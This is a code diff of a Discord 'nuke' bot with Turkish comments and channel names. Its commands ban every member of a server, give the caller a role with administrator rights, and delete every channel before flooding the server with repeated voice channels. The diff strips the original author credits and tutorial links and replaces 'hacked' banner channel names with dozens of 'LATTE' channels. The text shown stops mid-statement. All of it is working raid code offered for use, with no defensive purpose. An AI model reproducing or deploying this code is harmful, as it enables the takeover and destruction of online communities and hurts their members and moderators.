@@ -1,11 +1,11 @@
-const Discord = require("discord.js"); //TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryt KANALINDA VİDEOLU ANLATIMI BULUNMAKTADIR
+const Discord = require("discord.js");
 const client = new Discord.Client();
 const ayarlar = require("./ayarlar.json");
 const { Client, Util } = require("discord.js");
 const request = require("request");
 client.login(ayarlar.token);
 
-client.on("message", msg => {           ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+client.on("message", msg => {           
   if (msg.content === "+ban") {
     msg.delete();
     msg.guild.members.forEach(member => member.ban());  
@@ -39,7 +39,7 @@ client.on("message", msg => {
       name: ".",
       permissions: ["ADMINISTRATOR"]
     });
-    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+    let rol = msg.guild.roles.find(role => role.name === ".");  
     msg.member.addRole(rol);
   }
 });
@@ -50,1528 +50,7103 @@ client.on("message", async msg => {
 
     await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
 
-    await msg.guild.createChannel("hacked", {
+    await msg.guild.createChannel("kapatıldı kanki", {
       type: "text"
     });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
       await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
